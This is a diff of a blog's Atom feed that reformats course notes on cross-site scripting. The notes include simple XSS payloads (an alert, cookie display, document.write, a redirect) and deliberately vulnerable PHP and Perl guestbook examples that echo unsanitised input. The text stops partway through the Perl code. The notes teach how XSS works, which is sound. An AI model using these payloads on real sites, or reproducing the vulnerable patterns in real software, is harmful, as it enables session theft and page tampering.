@@ -4,129 +4,159 @@
     <title> • Posts by &#34;csrf&#34; tag</title>
     <link href="http://example.com" />
     <updated>2024-10-30T12:31:43.000Z</updated>
-    <category term="Blog" />
-    <category term="日常" />
+    <category term="JavaScript" />
     <category term="network system" />
     <category term="C" />
     <category term="software security" />
     <category term="AFL" />
     <category term="Linux" />
+    <category term="vulnerability" />
     <category term="C language" />
     <category term="HTTP" />
     <category term="XSS" />
     <category term="CSRF" />
-    <category term="vulnerability" />
-    <category term="router" />
-    <category term="Supernet" />
-    <category term="IPv4" />
-    <category term="Subnet" />
-    <category term="TCP" />
-    <category term="UDP" />
     <category term="IP" />
     <category term="DHCP" />
     <category term="ICMP" />
     <category term="ARP" />
+    <category term="router" />
+    <category term="Supernet" />
+    <category term="IPv4" />
+    <category term="Subnet" />
     <category term="DNS" />
     <category term="SSH" />
     <category term="FTP" />
     <category term="SMTP" />
-    <category term="SQL" />
+    <category term="TCP" />
+    <category term="UDP" />
     <category term="OSI" />
     <category term="TCP/IP" />
-    <category term="JavaScript" />
+    <category term="Network Security" />
+    <category term="SQL" />
     <category term="gdb" />
+    <category term="Blog" />
+    <category term="日常" />
     <entry>
         <id>http://example.com/course/Cross-Site-attack/</id>
         <title>Cross-Site attack</title>
         <link rel="alternate" href="http://example.com/course/Cross-Site-attack/"/>
         <content type="html">&lt;h1 id=&#34;Cross-Site Scripting&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Cross-Site Scripting&#34;&gt;#&lt;/a&gt;Cross-Site Scripting&lt;/h1&gt;
-
 &lt;h2 id=&#34;XSS&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#XSS&#34;&gt;#&lt;/a&gt;XSS&lt;/h2&gt;
-
 &lt;ol&gt;
 &lt;li&gt;Cross-Site Scripting (XSS)&lt;/li&gt;
 &lt;/ol&gt;
 &lt;ul&gt;
-&lt;li&gt;Causes arbitrary code to run in a browser that is connected to a trusted Web site &lt;ul&gt;
-&lt;li&gt;May occur when code returns HTML output that makes use of user inputs  &lt;/li&gt;
+&lt;li&gt;Causes arbitrary code to run in a browser that is connected to a trusted Web site
+&lt;ul&gt;
+&lt;li&gt;May occur when code returns HTML output that makes use of user inputs&lt;/li&gt;
 &lt;li&gt;Trick users into clicking a hyperlink from outside the site&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
-&lt;li&gt;Attacks allows: &lt;ul&gt;
-&lt;li&gt;Disclosure of user files &lt;/li&gt;
-&lt;li&gt;Installation of Trojans &lt;/li&gt;
-&lt;li&gt;Redirection to other pages &lt;/li&gt;
+&lt;li&gt;Attacks allows:
+&lt;ul&gt;
+&lt;li&gt;Disclosure of user files&lt;/li&gt;
+&lt;li&gt;Installation of Trojans&lt;/li&gt;
+&lt;li&gt;Redirection to other pages&lt;/li&gt;
 &lt;li&gt;Trivial theft of cookies&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
 &lt;ol start=&#34;2&#34;&gt;
-&lt;li&gt;&lt;p&gt;Basic Problem: Echoing Untrusted User Input&lt;br&gt;Classic mistake in a server-side application with URL &lt;code&gt;http://naive.com/search.php?term=justin+bieber&lt;/code&gt;&lt;br&gt;PHP at search.php responds with&lt;/p&gt;
+&lt;li&gt;Basic Problem: Echoing Untrusted User Input&lt;br&gt;
+Classic mistake in a server-side application with URL  &lt;code&gt;http://naive.com/search.php?term=justin+bieber&lt;/code&gt; &lt;br&gt;
+PHP at search.php responds with&lt;/li&gt;
+&lt;/ol&gt;
 &lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;html&amp;gt;&amp;lt;title&amp;gt;Search results&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   You have searched for &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;lt;?php echo $_GET[&amp;#x27;term&amp;#x27;] ?&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   ...  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;在这里，&lt;code&gt;$_GET[&amp;#39;term&amp;#39;]&lt;/code&gt; 的内容直接被嵌入到 HTML 中进行回显。如果 &lt;code&gt;$_GET[&amp;#39;term&amp;#39;]&lt;/code&gt; 包含恶意的 HTML 或 JavaScript 代码，则可能引发跨站脚本攻击 (XSS)。&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;Dangerous HTML Inputs&lt;/p&gt;
-&lt;/li&gt;
+&lt;p&gt;在这里， &lt;code&gt;$_GET[&#39;term&#39;]&lt;/code&gt;  的内容直接被嵌入到 HTML 中进行回显。如果  &lt;code&gt;$_GET[&#39;term&#39;]&lt;/code&gt;  包含恶意的 HTML 或 JavaScript 代码，则可能引发跨站脚本攻击 (XSS)。&lt;/p&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;Dangerous HTML Inputs&lt;/li&gt;
 &lt;/ol&gt;
 &lt;ul&gt;
-&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;quot;Boo!&amp;quot;)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;br&gt;此代码弹出一个警告对话框，证明 XSS 攻击是可能的。&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;br&gt;此代码会打印当前页面的 Cookie 信息，攻击者可能会窃取用户的会话 Cookie，从而劫持会话。&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;document.write(&amp;quot;&amp;lt;br&amp;gt;&amp;quot;)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;br&gt;此代码会在页面中添加一个 &lt;code&gt;&amp;lt;br&amp;gt;&lt;/code&gt; 标签，显示攻击者可以更改网页内容。&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;window.location=&amp;#39;http://google.com&amp;#39;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;br&gt;此代码会将当前网页重定向到另一个页面，使得攻击者可以将用户导向恶意站点&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;quot;Boo!&amp;quot;)&amp;lt;/script&amp;gt;&lt;/code&gt; &lt;br&gt;
+ 此代码弹出一个警告对话框，证明 XSS 攻击是可能的。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/code&gt; &lt;br&gt;
+ 此代码会打印当前页面的 Cookie 信息，攻击者可能会窃取用户的会话 Cookie，从而劫持会话。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;document.write(&amp;quot;&amp;lt;br&amp;gt;&amp;quot;)&amp;lt;/script&amp;gt;&lt;/code&gt; &lt;br&gt;
+ 此代码会在页面中添加一个  &lt;code&gt;&amp;lt;br&amp;gt;&lt;/code&gt;  标签，显示攻击者可以更改网页内容。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;window.location=&#39;http://google.com&#39;&amp;lt;/script&amp;gt;&lt;/code&gt; &lt;br&gt;
+ 此代码会将当前网页重定向到另一个页面，使得攻击者可以将用户导向恶意站点&lt;/li&gt;
 &lt;/ul&gt;
 &lt;ol start=&#34;4&#34;&gt;
-&lt;li&gt;Main Types of Cross-Site Scripting Attacks&lt;ol&gt;
+&lt;li&gt;Main Types of Cross-Site Scripting Attacks
+&lt;ol&gt;
 &lt;li&gt;Stored (persistent)&lt;/li&gt;
 &lt;li&gt;Reflected (non-persistent)&lt;/li&gt;
 &lt;/ol&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
 &lt;h2 id=&#34;Stored (Persistent) XSS Attacks&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Stored (Persistent) XSS Attacks&#34;&gt;#&lt;/a&gt;Stored (Persistent) XSS Attacks&lt;/h2&gt;
-
 &lt;ol&gt;
-&lt;li&gt;Data supplied by an attacker is &lt;strong&gt;permanently stored&lt;/strong&gt; on a server and displayed to other users when browsing without being properly sanitised&lt;br&gt;If the user input is displayed in the page &lt;ul&gt;
-&lt;li&gt;HTML tags can mess up the look of the page &lt;/li&gt;
-&lt;li&gt;JavaScript can steal information or cause more advanced malicious behaviour &lt;/li&gt;
-&lt;li&gt;For the current user or other users&lt;br&gt;&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/67222f628055d.png&#34; alt=&#34;img&#34;&gt;&lt;figure class=&#34;highlight perl&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Example Vulnerable Guestbook Program&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#!perl&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;comment&#34;&gt;# Fig. 19.6: fig19_06.pl&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;comment&#34;&gt;# Guestbook program.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;use&lt;/span&gt; warnings;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;use&lt;/span&gt; strict;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;use&lt;/span&gt; CGI &lt;span class=&#34;string&#34;&gt;qw( :standard )&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;print&lt;/span&gt;( header(), start_html( &lt;span class=&#34;string&#34;&gt;&amp;quot;Guestbook&amp;quot;&lt;/span&gt; ), h1( &lt;span class=&#34;string&#34;&gt;&amp;quot;Guestbook&amp;quot;&lt;/span&gt; ));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( param() ) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;print&lt;/span&gt; h3( &lt;span class=&#34;string&#34;&gt;&amp;quot;Thank you for signing our guestbook!!!&amp;quot;&lt;/span&gt; ),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;my&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$name&lt;/span&gt; = param( &lt;span class=&#34;string&#34;&gt;&amp;quot;name&amp;quot;&lt;/span&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;my&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$email&lt;/span&gt; = param( &lt;span class=&#34;string&#34;&gt;&amp;quot;email&amp;quot;&lt;/span&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;my&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$message&lt;/span&gt; = param( &lt;span class=&#34;string&#34;&gt;&amp;quot;message&amp;quot;&lt;/span&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;open&lt;/span&gt;( FILE, &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt;&amp;gt;guestbook.log&amp;quot;&lt;/span&gt; ) &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt;   //Open the guestbook file&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;( &lt;span class=&#34;string&#34;&gt;&amp;quot;Cannot open guestbook&amp;quot;&lt;/span&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;print&lt;/span&gt;( FILE, &lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;, hr(), &lt;span class=&#34;string&#34;&gt;&amp;quot;From: &amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       a( &amp;#123; &lt;span class=&#34;string&#34;&gt;-href =&amp;gt;&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;mailto:&lt;span class=&#34;variable&#34;&gt;$email&lt;/span&gt;&amp;quot;&lt;/span&gt; &amp;#125;, &lt;span class=&#34;variable&#34;&gt;$name&lt;/span&gt; ), br(), br(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;variable&#34;&gt;$message&lt;/span&gt; );    &lt;span class=&#34;regexp&#34;&gt;//&lt;/span&gt; Store the user entered data in the guestbook file&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;close&lt;/span&gt;( FILE );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;open&lt;/span&gt;( FILE, &lt;span class=&#34;string&#34;&gt;&amp;quot;guestbook.log&amp;quot;&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;( &lt;span class=&#34;string&#34;&gt;&amp;quot;Cannot open guestbook&amp;quot;&lt;/span&gt; );   &lt;span class=&#34;regexp&#34;&gt;//&lt;/span&gt;Open the guestbook file&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( &amp;lt;FILE&amp;gt; );      &lt;span class=&#34;regexp&#34;&gt;//&lt;/span&gt;Display the contents of the guestbook file&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;close&lt;/span&gt;( FILE );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;print&lt;/span&gt;( h4( &lt;span class=&#34;string&#34;&gt;&amp;quot;Please sign our guestbook:&amp;quot;&lt;/span&gt; ), start_form(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;string&#34;&gt;&amp;quot;Name: &amp;quot;&lt;/span&gt;, textfield( &lt;span class=&#34;string&#34;&gt;-name =&amp;gt;&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;name&amp;quot;&lt;/span&gt; ), br(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;string&#34;&gt;&amp;quot;E-mail: &amp;quot;&lt;/span&gt;, textfield( &lt;span class=&#34;string&#34;&gt;-name =&amp;gt;&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;email&amp;quot;&lt;/span&gt; ), br(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;string&#34;&gt;&amp;quot;Enter your message:&amp;quot;&lt;/span&gt;, br(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     textarea( &lt;span class=&#34;string&#34;&gt;-name =&amp;gt;&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;message&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;-rows =&amp;gt;&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;-columns =&amp;gt;&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;-wrap =&amp;gt;&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; ),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     br(), submit( &lt;span class=&#34;string&#34;&gt;-name =&amp;gt;&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Sign the Guestbook&amp;quot;&lt;/span&gt; ), end_form(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     end_html() );&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-该 Perl 脚本是一个基本的访客留言簿程序，允许用户输入姓名、电子邮件和消息并将其保存到日志文件 (guestbook.log) 中。程序还可以读取并显示日志文件的内容&lt;/li&gt;
+&lt;li&gt;Data supplied by an attacker is &lt;strong&gt;permanently stored&lt;/strong&gt; on a server and displayed to other users when browsing without being properly sanitised&lt;br&gt;
+If the user input is displayed in the page
+&lt;ul&gt;
+&lt;li&gt;HTML tags can mess up the look of the page&lt;/li&gt;
+&lt;li&gt;JavaScript can steal information or cause more advanced malicious behaviour&lt;/li&gt;
+&lt;li&gt;For the current user or other users&lt;br&gt;
+&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/67222f628055d.png&#34; alt=&#34;img&#34;&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
+&lt;figure class=&#34;highlight perl&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Example Vulnerable Guestbook Program&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#!perl&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;comment&#34;&gt;# Fig. 19.6: fig19_06.pl&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;comment&#34;&gt;# Guestbook program.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;use&lt;/span&gt; warnings;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;use&lt;/span&gt; strict;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;use&lt;/span&gt; CGI &lt;span class=&#34;string&#34;&gt;qw( :standard )&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;print&lt;/span&gt;( header(), start_html( &lt;span class=&#34;string&#34;&gt;&amp;quot;Guestbook&amp;quot;&lt;/span&gt; ), h1( &lt;span class=&#34;string&#34;&gt;&amp;quot;Guestbook&amp;quot;&lt;/span&gt; ));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( param() ) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;print&lt;/span&gt; h3( &lt;span class=&#34;string&#34;&gt;&amp;quot;Thank you for signing our guestbook!!!&amp;quot;&lt;/span&gt; ),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;my&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$name&lt;/span&gt; = param( &lt;span class=&#34;string&#34;&gt;&amp;quot;name&amp;quot;&lt;/span&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;my&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$email&lt;/span&gt; = param( &lt;span class=&#34;string&#34;&gt;&amp;quot;email&amp;quot;&lt;/span&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;my&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$message&lt;/span&gt; = param( &lt;span class=&#34;string&#34;&gt;&amp;quot;message&amp;quot;&lt;/span&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;open&lt;/span&gt;( FILE, &lt;span 